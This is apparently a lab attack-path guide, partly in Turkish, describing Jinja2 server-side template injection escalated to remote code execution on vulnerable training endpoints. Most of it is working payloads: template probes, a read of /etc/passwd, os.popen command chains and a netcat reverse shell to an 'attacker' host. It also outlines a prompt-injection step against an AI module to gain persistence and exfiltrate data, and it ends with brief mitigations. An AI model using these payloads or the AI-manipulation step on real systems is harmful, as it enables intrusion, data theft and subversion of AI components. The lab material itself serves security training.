# Attack Path 3: SSTI → RCE → Post-Exploitation

## Overview
Server-Side Template Injection ile Jinja2 template'lerinde kod execution → RCE → AI modülü abuse.

## Mermaid Diagram
```mermaid
graph TD
    A[User Input: Template field<br>e.g. profile bio veya report name]
    A --> B[SSTI: {{7*7}} test → 49 dönerse vulnerable]
    B --> C[Exploit: {{ config.__class__.__init__.__globals__['os'].popen'id'.read }}]
    C --> D[RCE: Komut execution → reverse shell]
    D --> E[AI Post-Exploit: Prompt injection ile AI modülünü kandır<br>→ persistence veya daha fazla exfil]
    E --> F[End: System compromise]
```

## Adım Adım Senaryo

1. **SSTI tespit et** - `{{7*7}}` → 49 dönerse Jinja2 SSTI vulnerable.
2. **Payload ile OS komutu çalıştır** - Config/globals zinciri ile `os.popen()`.
3. **Reverse shell al** - Komut execution ile netcat/bash reverse shell.
4. **AI post-exploit** - Prompt injection → AI'yi kendi lehine kullan.

## Vulnerable Endpoints
- `/vuln/ssti/greeting?name=` - Basic SSTI
- `/vuln/ssti/email?subject=&body=` - Email template SSTI

## Example Payloads
```python
# Detection
{{7*7}}
{{config}}

# Read files
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}

# RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}

# Reverse shell
{{config.__class__.__init__.__globals__['os'].popen('nc -e /bin/sh attacker 4444').read()}}
```

## Difficulty
**Hard**

## Mitigation
- Sandboxed template rendering
- Input escaping before template
- Use `render_template()` not `render_template_string()`
